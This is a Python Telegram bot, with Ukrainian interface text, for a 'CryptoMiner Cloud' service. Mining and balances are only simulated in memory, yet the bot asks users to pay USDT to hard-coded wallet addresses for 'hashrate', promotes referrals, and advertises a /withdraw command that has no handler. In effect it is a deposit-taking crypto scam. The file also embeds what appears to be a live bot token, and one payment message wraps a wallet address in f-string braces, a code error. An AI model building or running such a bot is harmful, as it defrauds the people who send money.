import asyncio
import logging
import os
import time
from aiohttp import web
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo

# --- НАЛАШТУВАННЯ ---
BOT_TOKEN = os.getenv("BOT_TOKEN", "8668016567:AAE0paiP1abF7YF8Ydm2B96-lmODTPBU5Wo")
WEB_APP_URL = "https://eror8086-cmyk.github.io/bot/"

# Адреси для депозиту (змініть на власні)
USDT_TRC20_WALLET = "TJJLytKVRBnXRpuRKuVJYEjRYfhu31Dsqa"
USDT_BEP20_WALLET = "0x02dc7264ed3b9d32b96fe36f7b2dc6ffa61fe735"

# Фікс для asyncio
try:
    asyncio.get_running_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# --- БАЗА ДАНИХ В ПАМ'ЯТІ (Базова симуляція для легкого запуску) ---
users_db = {}

def get_user(user_id, username, first_name):
    if user_id not in users_db:
        users_db[user_id] = {
            "username": username,
            "first_name": first_name,
            "hashrate": {"BTC": 100.0, "ETH": 0.0, "BNB": 0.0, "SOL": 0.0, "TRX": 0.0}, # GH/s / TH/s
            "balances": {"BTC": 0.00005000, "ETH": 0.00000000, "BNB": 0.0, "SOL": 0.0, "TRX": 0.0},
            "last_update": time.time(),
            "referrals": 0,
            "used_promos": []
        }
    else:
        # Оновлення балансу за час відсутності
        update_user_balance(user_id)
    return users_db[user_id]

def update_user_balance(user_id):
    user = users_db[user_id]
    now = time.time()
    elapsed = now - user["last_update"]
    user["last_update"] = now

    # Формула нарахування майнінгу: Hashrate * Коефіцієнт * Секунди
    # 100 GH/s BTC дає приблизно 0.00000001 BTC за 10 секунд
    btc_rate = 0.00000000001
    earned_btc = user["hashrate"]["BTC"] * btc_rate * elapsed
    user["balances"]["BTC"] += earned_btc

# --- КЛАВІАТУРИ ---
def main_menu():
    kb = [
        [InlineKeyboardButton(text="🚀 Запустити Mini App", web_app=WebAppInfo(url=WEB_APP_URL))],
        [
            InlineKeyboardButton(text="⛏️ Mining", callback_data="menu_mining"),
            InlineKeyboardButton(text="💰 Мій баланс", callback_data="menu_balance")
        ],
        [
            InlineKeyboardButton(text="⚡ Мій Hashrate", callback_data="menu_hashrate"),
            InlineKeyboardButton(text="➕ Купити Hashrate", callback_data="menu_buy")
        ],
        [
            InlineKeyboardButton(text="💸 Вивести", callback_data="menu_withdraw"),
            InlineKeyboardButton(text="👥 Реферали", callback_data="menu_ref")
        ],
        [
            InlineKeyboardButton(text="🎁 Промокод", callback_data="menu_promo"),
            InlineKeyboardButton(text="❓ Допомога", callback_data="menu_help")
        ]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def back_btn():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Головне меню", callback_data="menu_main")]
    ])

# --- ОБРОБНИКИ КОМАНД ---
@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    user = get_user(message.from_user.id, message.from_user.username, message.from_user.first_name)
    
    # Перевірка реферального посилання (/start REF_ID)
    args = message.text.split()
    if len(args) > 1 and args[1].isdigit():
        ref_id = int(args[1])
        if ref_id in users_db and ref_id != message.from_user.id:
            users_db[ref_id]["referrals"] += 1
            users_db[ref_id]["hashrate"]["BTC"] += 20.0 # Бонус +20 GH/s за реферала

    await message.answer(
        f"👋 Вітаємо, **{message.from_user.first_name}** у **CryptoMiner Cloud**!\n\n"
        "⚡ Ваш майнінг-акаунт успішно активовано.\n"
        "Отримано стартовий бонус: **100 GH/s (BTC)**!\n\n"
        "ℹ️ *Сервіс працює за симуляційною моделлю Cloud-Mining з прозорими формулами розрахунку.*",
        parse_mode="Markdown",
        reply_markup=main_menu()
    )

@dp.callback_query(F.data == "menu_main")
async def cb_main(callback: types.CallbackQuery):
    await callback.answer()
    await callback.message.edit_text("📱 **Головне меню CryptoMiner Platform:**", parse_mode="Markdown", reply_markup=main_menu())

@dp.callback_query(F.data == "menu_mining")
async def cb_mining(callback: types.CallbackQuery):
    await callback.answer()
    user = get_user(callback.from_user.id, callback.from_user.username, callback.from_user.first_name)
    
    text = (
        f"⛏️ **MINING DASHBOARD**\n\n"
        f"👤 ID: `{callback.from_user.id}`\n"
        f"💎 Активний актив: **BTC (Bitcoin)**\n"
        f"⚡ Поточний Hashrate: **{user['hashrate']['BTC']} GH/s**\n\n"
        f"💰 Нараховано балансу:\n`{user['balances']['BTC']:.8f} BTC`\n\n"
        f"📈 Статус майнінгу: 🟢 **АКТИВНИЙ**\n"
        f"⏱️ Нарахування відбуваються автоматично кожні 10 секунд."
    )
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=back_btn())

@dp.callback_query(F.data == "menu_balance")
async def cb_balance(callback: types.CallbackQuery):
    await callback.answer()
    user = get_user(callback.from_user.id, callback.from_user.username, callback.from_user.first_name)
    
    text = (
        "💰 **ВАШІ БАЛАНСИ:**\n\n"
        f"🪙 BTC: `{user['balances']['BTC']:.8f}`\n"
        f"🪙 ETH: `{user['balances']['ETH']:.8f}`\n"
        f"🪙 BNB: `{user['balances']['BNB']:.8f}`\n"
        f"🪙 SOL: `{user['balances']['SOL']:.8f}`\n"
        f"🪙 TRX: `{user['balances']['TRX']:.8f}`"
    )
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=back_btn())

@dp.callback_query(F.data == "menu_buy")
async def cb_buy(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        "➕ **КУПІВЛЯ HASHRATE (USDT)**\n\n"
        "Оберіть тарифний план:\n"
        "• **10 USDT** ➡️ 100 GH/s\n"
        "• **25 USDT** ➡️ 300 GH/s\n"
        "• **50 USDT** ➡️ 700 GH/s\n"
        "• **100 USDT** ➡️ 1500 GH/s\n\n"
        "💳 **Реквізити для оплати:**\n"
        f"TRC20 Address:\n`{TJJLytKVRBnXRpuRKuVJYEjRYfhu31Dsqa}`\n\n"
        f"BEP20 Address:\n`{0x02dc7264ed3b9d32b96fe36f7b2dc6ffa61fe735}`\n\n"
        "⚠️ Після переказу коштів надішліть скріншот або хеш транзакції в підтримку."
    )
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=back_btn())

@dp.callback_query(F.data == "menu_withdraw")
async def cb_withdraw(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        "💸 **ВИВЕДЕННЯ КОШТІВ**\n\n"
        "Мінімальні суми для виводу:\n"
        "• BTC: 0.0005 BTC (Комісія: 0.00005 BTC)\n"
        "• ETH: 0.01 ETH\n"
        "• TRX: 50 TRX\n\n"
        "Для виведення коштів відправте команду у форматі:\n"
        "`/withdraw BTC ВАШ_ГАМАНЕЦЬ СУМА`"
    )
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=back_btn())

@dp.callback_query(F.data == "menu_ref")
async def cb_ref(callback: types.CallbackQuery):
    await callback.answer()
    user = get_user(callback.from_user.id, callback.from_user.username, callback.from_user.first_name)
    bot_info = await bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start={callback.from_user.id}"
    
    text = (
        "👥 **РЕФЕРАЛЬНА ПРОГРАМА**\n\n"
        f"Запрошено користувачів: **{user['referrals']}**\n"
        "Бонус за кожного друга: **+20 GH/s Hashrate**\n\n"
        f"🔗 Ваше реферальне посилання:\n`{ref_link}`"
    )
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=back_btn())

@dp.callback_query(F.data == "menu_help")
async def cb_help(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        "❓ **ДОПОМОГА ТА УМОВИ**\n\n"
        "• Платформа розраховує винагороду пропорційно вашому Hashrate.\n"
        "• Ви можете збільшувати Hashrate за допомогою купівлі за USDT або запрошення друзів.\n"
        "• Гарантій доходу немає, сервіс працює за прозорою моделлю розподілу потужностей."
    )
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=back_btn())

# --- ВЕБ-СЕРВЕР ДЛЯ РЕНДЕРА (щоб бот не вимикався) ---
async def handle_ping(request):
    return web.Response(text="Cloud Mining Bot Alive!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def main():
    logging.basicConfig(level=logging.INFO)
    asyncio.create_task(start_web_server())
    print("Cloud Mining Bot успішно запущено!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
